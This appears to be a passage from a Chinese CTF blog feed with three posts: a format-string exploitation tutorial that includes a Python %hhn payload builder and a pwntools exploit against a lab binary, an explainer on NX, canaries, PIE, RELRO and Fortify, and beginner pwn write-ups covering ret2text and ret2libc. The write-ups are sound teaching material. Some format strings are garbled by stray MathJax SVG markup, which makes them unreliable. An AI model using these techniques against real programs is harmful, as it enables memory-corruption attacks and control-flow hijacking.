 <use xlink:href="#E1-MJMATHI-70" x="2118" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="2621" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3151" y="0"/>
 <use xlink:href="#E1-MJMAIN-32" x="3674" y="0"/>
<g transform="translate(4175,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>n&#x27;+pad3+&#x27;%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.19ex" height="2.843ex" style="vertical-align: -0.671ex;" viewbox="0 -934.9 5248.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">n'+pad4+'%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMAIN-34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="849" y="583"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1117" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="2118" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="2621" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3151" y="0"/>
 <use xlink:href="#E1-MJMAIN-34" x="3674" y="0"/>
<g transform="translate(4175,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>n&#x27;<br></code></pre></td></tr></table></figure>

<p>我们可以依次进行计算。这里给出一个基本的构造，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br>payload = fmt_str(<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x0804A028</span>,<span class="hljs-number">0x12345678</span>)<br></code></pre></td></tr></table></figure>

<p>其中每个参数的含义基本如下</p>
<ul>
<li>offset表示要覆盖的地址最初的偏移</li>
<li>size表示机器字长</li>
<li>addr表示将要覆盖的地址。</li>
<li>target表示我们要覆盖为的目的变量值。</li>
</ul>
<p>相应的exploit如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./overwrite&#x27;</span>: pid <span class="hljs-number">78547</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="4.073ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 1753.5 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hhn%222c%7</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="576" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="1153" y="0"/>
</g>
</svg>hhn%222c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="4.073ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 1753.5 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hhn%222c%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="576" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="1153" y="0"/>
</g>
</svg>hhn<br>[*] Process <span class="hljs-string">&#x27;./overwrite&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">78547</span>)<br><span class="hljs-number">0xfff6f9bc</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b <span class="hljs-keyword">for</span> a big number!<br></code></pre></td></tr></table></figure>

<p>当然，我们也可以利用%n分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用%hhn则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
]]></content>
      <tags>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区保护机制</title>
    <url>/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>为了更好地对缓冲区进行利用，十分有必要了解一下checksec所检查出的漏洞缓解措施都意味着什么</p>
<p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191658.png"></p>
<p>如图上所示，RELRO、Stack、NX、PIE四种保护机制，下方介绍时，括号里的是在Windows系统中的名称</p>
<p>以下主要来源于《从0到1CTFer成长之路》</p>
<h3 id="一、NX-DEP"><a href="#一、NX-DEP" class="headerlink" title="一、NX(DEP)"></a>一、NX(DEP)</h3><p>NX即是No-execute，不可执行。原理是通过现代操作系统的内存保护单元机制（MPU）对程序内存按页的粒度进行权限设置，其基本规则为<strong>可写权限与可执行权限互斥</strong>。因此开启了NX的程序代表着堆栈上写入的代码数据将不可被执行，也就无法直接通过溢出写入shellcode而执行任意代码。</p>
<p>所有可以被修改写入的数据的内存都不可执行，所有可执行的代码数据都是不可修改的。这就是可执行权限与可写权限互斥</p>
<p>GCC编写程序默认开启NX，关闭方法是在编译是加入**-z execstack参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z execstack -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="二、Stack-Canary"><a href="#二、Stack-Canary" class="headerlink" title="二、Stack Canary"></a>二、Stack Canary</h3><p>Stack Canary保护一种针对栈溢出攻击而设计的保护机制。当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，因此Stack Canary会在函数开始执行前，在返回地址前写入一个字长的随机数据（可以称这个数据为canary，在Windows下是cookie），之后可以在函数返回前进行检验随机数据是否被更改，如果发生更改将直接终止程序进行保护。</p>
<p>GCC编写程序默认开启Stack Canary，关闭方法是在编译时加入**-fno-stack-protector参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="三、PIE"><a href="#三、PIE" class="headerlink" title="三、PIE"></a>三、PIE</h3><p>在介绍PIE前，要先介绍ASLR即Address Space Layout Randomization，地址空间分布随机化。ASLR是系统等级的保护机制，只有在开启了ASLR后PIE才能生效。而ASLR的目的是将程序的堆栈地址和动态链接库（或称为共享库）的加载基址进行一定的随机化，这些地址之间是不可读写执行的未映射内存。</p>
<p>关闭ASLR关闭方式是修改**/proc/sys/kernel/randomize_va_space**文件为0</p>
<p>PIE的目的则是让可执行程序ELF文件的基址进行随机化加载（负责代码段和数据段的随机化），从而使得攻击者难以知道程序的内存结构，与ASLR相互配合。</p>
<p>GCC编写程序开启方法是加入**-fpic -pie参数<strong>。较新版本的GCC默认开启PIE，可以设置</strong>-no-pie**关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fpic -pie -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="四、Full-Relro"><a href="#四、Full-Relro" class="headerlink" title="四、Full Relro"></a>四、Full Relro</h3><p>Full Relro 保护措施与Linux下的Lazy Binding机制有关，主要作用是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，禁止.GOT.PLT表和其他一些相关内存的读写，从而阻止攻击者直接进行修改程序所要执行的函数</p>
<ul>
<li>RELRO防御策略：<ul>
<li>为NO RELRO的时候，<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读可写</li>
<li>为PARTIAL RELRO的时候，<code>init.array</code>、<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写</li>
<li>为FULL RELRO时，<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读不可写。</li>
</ul>
</li>
</ul>
<p>GCC开启Full Relro 的方法是加入**-z relro参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z relro -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="五、Fortify"><a href="#五、Fortify" class="headerlink" title="五、Fortify"></a>五、Fortify</h3><p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191855.png"></p>
<p>这部分转载自<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec及其包含的保护机制/</a></p>
<p>FORTIFY_SOURCE 机制对格式化字符串有两个限制</p>
<p> （1）包含%n的格式化字符串不能位于程序内存中的可写地址。</p>
<p>（2）当使用位置参数时，必须使用范围内的所有参数。</p>
<p>所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6</p>
<p>当进入到gdb中进行checksec检查文件会发现多了一个保护措施Fortify，这是一种比较少见的保护措施，是为了防止缓冲区溢出攻击</p>
<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span> </span>&#123;<br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];<br>        <span class="hljs-built_in">strcpy</span>(buf, s);<br>        <span class="hljs-comment">/* Don&#x27;t allow gcc to optimise away the buf */</span><br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> :: <span class="hljs-string">&quot;m&quot;</span> (buf))</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用包含参数-U_FORTIFY_SOURCE编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048450 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; 将0x118存储到栈上<br>  mov    0x8(%ebp),%eax     ; 将目标参数载入eax<br>  mov    %eax,0x4(%esp)     ; 保存目标参数<br>  lea    -0x108(%ebp),%eax  ; 数组buf<br>  mov    %eax,(%esp)        ; 保存<br>  call   8048320 &lt;strcpy@plt&gt;<br><br>  leave                     ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048470 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; <br>  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存<br>  mov    0x8(%ebp),%eax     ; <br>  mov    %eax,0x4(%esp)     ; <br>  lea    -0x108(%ebp),%eax  ; <br>  mov    %eax,(%esp)        ; <br>  call   8048370 &lt;__strcpy_chk@plt&gt;<br><br>  leave                      ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界pwn新手题wp</title>
    <url>/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/</url>
    <content><![CDATA[<h3 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h3><p>题目所给的附件并无作用，直接进入虚拟机中用nc连接所给的ip，即可获取flag</p>
<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ图片20210316210045.png" style="zoom: 80%;">

<h3 id="二、CGfsb"><a href="#二、CGfsb" class="headerlink" title="二、CGfsb"></a>二、CGfsb</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是</p>
<h3 id="三、when-did-you-born"><a href="#三、when-did-you-born" class="headerlink" title="三、when_did_you_born"></a>三、when_did_you_born</h3><p>checksec一下附件，发现是64位文件，以及一些开启的保护措施，具体的拖入ida进行分析</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323214845.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323215315.png"></p>
<p>程序很简单，就是要你输入一个数字，代表你的出生年龄，但是一开始并不能输入1926，然后程序往下继续运行，会发现，只有你输入的出生年份是1926才能获得flag，很明显的溢出覆盖了，往前找，get(&amp;v4)无限制的输入，可以造成溢出而覆盖v5的值变成1926而得到flag，exp如下</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323220128.png"></p>
<h3 id="四、hello-pwn"><a href="#四、hello-pwn" class="headerlink" title="四、hello_pwn"></a>四、hello_pwn</h3><p>惯例的先运行一下附件，貌似啥都没能发现，然后查看一下文件是32位还是64位，再拖入相应的ida中开始进一步的分析</p>
<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ图片20210316210858.png" style="zoom: 80%;">



<p>在ida中F5反汇编后，代码十分简单<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ图片20210316211445.png" style="zoom: 67%;"></p>
<p>并没有什么内容，到处看看，在if条件后的函数里面发现了<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316214111.png"></p>
<p>思路就很清晰了，我们只需要让程序执行到这个函数就可以获取flag，而要执行到这里就要满足if里面的条件，让变量等于</p>
<p>1853186401即可，此时查看一下变量处于的位置，以及计算距离read可输入地址的偏差，最后得出exp如下</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316211433.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316214844.png"></p>
<p>注意exp要print出来，因为这样才能把接收到flag打印出来，显示在shell中</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210316214934.png"></p>
<h3 id="五、level0"><a href="#五、level0" class="headerlink" title="五、level0"></a>五、level0</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是64位的，拖入ida中分析</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323220433.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323220729.png"></p>
<p>发现read写入函数可以写入的内容长度十分大，完全足以覆盖返回地址、执行任意指令了，接下来就是去寻找一下可以进行获取shell权限的函数之类的代码，可以发现在一个名为callsystem的函数里面有着如图的程序<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323221023.png"></p>
<p>看到这个，也代表着权限函数也找到了，之后只需要进行简单的计算偏移地址进行覆盖返回地址，从而跳转到这个函数执行即可获取flag，exp如下：</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323221229.png"></p>
<p>顺便提一下，callsystem函数的地址可以在左边函数列表拖向右边看到，或者在右下角也有</p>
<h3 id="六、level2"><a href="#六、level2" class="headerlink" title="六、level2"></a>六、level2</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是32位的，再去ida中进行静态分析，</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326201427.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326202416.png"></p>
<p>计算偏差之后，可以发现存在溢出，之后就是寻找系统函数，跳转拿到shell权限</p>
<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ图片20210326202641.png" style="zoom:50%;">

<p>发现存在着/bin/sh和system函数，足以构造payload了，exp如下：</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326203123.png"></p>
<h3 id="七、level3"><a href="#七、level3" class="headerlink" title="七、level3"></a>七、level3</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是32位的</p>
<p>![](2021-03-16-攻防世界pwn新手题wp.assets/QQ图片20210326203123-1616762538191.png</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326204057.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326204257.png"></p>
<p>跟level2一样的溢出点，但是查找函数和字符串列表找不到system和binsh字符串了，那此时就需要使用到libc这个共享库了，文件里面已经包含了这个共享库，可以直接使用，通过libc从而获得system和binsh字符串的绝对地址，而为了获取这两个，就要使用附件里面已经被调用的函数取计算该函数的绝对地址和libc库地址的偏差，因为在偏差是一样的，所以可以借此获得system和binsh字符串的绝对地址，exp如下：<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210326205423.png"></p>
